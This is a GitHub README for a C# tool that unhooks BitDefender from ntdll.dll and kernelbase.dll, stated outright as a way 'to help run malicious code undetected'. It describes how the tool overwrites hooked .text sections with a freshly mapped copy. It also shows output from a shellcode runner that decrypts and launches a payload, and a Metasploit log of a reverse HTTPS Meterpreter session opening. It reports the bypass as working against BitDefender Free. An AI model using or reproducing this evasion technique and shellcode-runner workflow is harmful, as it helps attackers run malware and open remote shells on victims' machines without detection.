# Unhook Bit Defender
A C# application that unhooks **BitDefender** from **ntdll.dll** and **kernelbase.dll** to help run malicious code undetected.

The code is quite long (particularly the native Win32 structs), and I'm sure it could be optimised.

# Introduction
This C# code is based upon one of the techniques demonstrated in the RED TEAM Operator: Windows Evasion Course from [Sektor7](https://institute.sektor7.net), the original is written in C/C++. I would recommend any of the malware development courses, there is a lot of great stuff to learn about creating malware in C/C++.

When Windows creates a new process BitDefender injects the **atcuf64.dll** DLL into the process and hooks many of the **ntdll.dll/kernelbase.dll** functions. If, for example, `NtCreateProcess` is called by malicious code BitDefender is able to intercept the call, do it's anti-malware magic, then return execution to the thread (or kill the process if it is malicious).

The code maps another version of a DLL in memory, finds the `.text` section, and copies it over the hoooked version.

The code has been updated so you can map and unhook any DLL in memory.

# Proof of Concept in x64dbg

The following image shows the `ZwCreateProcess` function when BitDefender is not present:

![No Bit Defender](https://github.com/plackyhacker/UnhookBitDefender/blob/main/NoBitDef.png?raw=true)


The following image shows the `ZwCreateProcess` function when Bit Defender has hooked into **ntdll.dll**. We can see the `jmp` instruction (this is the hook):

![No Bit Defender](https://github.com/plackyhacker/UnhookBitDefender/blob/main/BitDefHooks.png?raw=true)


And finally, this image shows the `ZwCreateProcess` function after being unhooked (the `jmp` instruction has been reverted back to the normal syscall):

![No Bit Defender](https://github.com/plackyhacker/UnhookBitDefender/blob/main/BitDefUnhooked.png?raw=true)


# Example
 
Execution of the code is shown below:

```
[+] Mapping Ntdll...
[+] Unhooking Ntdll...
[+] Original Dll address is 0x7FFE23450000
[+] Mapped Dll address is 0x2396A520000
[+] Mapped Dll is a valid image.
[+] e_lfanew equals 0xE8
[+] NT_HEADERS address is 0x2396A5200E8
[+] Mapped Dll NT Headers is valid.
[+] Sections to enumerate is 10
[+] First section is .text
[+] First section is at 0x2396A5201F0
[+] Analysing section .text
[+] .text section is at 0x2396A5201F0
[+] VirtualProtect Dll to PAGE_EXECUTE_READWRITE...
[+] Unhooking Dll by copying mapped data...
[+] VirtualProtect Dll to PAGE_EXECUTE_WRITECOPY...
[+] Unmapping view of Dll...

[+] Mapping Kernelbase...
[+] Unhooking Kernelbase...
[+] Original Dll address is 0x7FFE20CB0000
[+] Mapped Dll address is 0x2396A520000
[+] Mapped Dll is a valid image.
[+] e_lfanew equals 0xF0
[+] NT_HEADERS address is 0x2396A5200F0
[+] Mapped Dll NT Headers is valid.
[+] Sections to enumerate is 7
[+] First section is .text
[+] First section is at 0x2396A5201F8
[+] Analysing section .text
[+] .text section is at 0x2396A5201F8
[+] VirtualProtect Dll to PAGE_EXECUTE_READWRITE...
[+] Unhooking Dll by copying mapped data...
[+] VirtualProtect Dll to PAGE_EXECUTE_WRITECOPY...
[+] Unmapping view of Dll...

[+] Shellcode runner...
[+] Decrypting payload...
[+] VirtualAlloc...
[+] RtlMoveMemory...
[+] VirtualProtect (PAGE_NOACCESS)...
[+] Sleeping...
[+] VirtualProtect (PAGE_EXECUTE_READ)...
[+] ResumeThread...
```

And the magical meterpreter session:

```
msf6 exploit(multi/handler) >
[*] Started HTTPS reverse handler on https://192.168.1.228:443
[*] https://192.168.1.228:443 handling request from 192.168.1.142; (UUID: dqyy0qcu) Staging x64 payload (201308 bytes) ...
[*] Meterpreter session 1 opened (192.168.1.228:443 -> 192.168.1.142:59384) at 2021-10-11 08:21:51 +010
```

# Notes
~~I haven't tested the code with anything malicious yet to see if it bypasses BitDefender. I will post my findings when I do.~~

~~I tested this against Bit Defender with a very basic `Virtualalloc`, `RtlMoveMemory`, `VirtualProtect`, `CreateThread` classic combo (with an encrypted payload). Bit Defender didn't detect anything malicious on disk (with scanning) but did kill the process when `CreateThread` was called.~~

The code was updated to unhook any loaded DLL. Unhooking **ntdll.dll** and **kernelbase.dll** bypasses BitDefender in my tests.

Tested with windows/x64/meterpreter/reverse_https on Windows 10 Pro (build 10.0.19043) with BitDefender AntiVirus Free Edition.
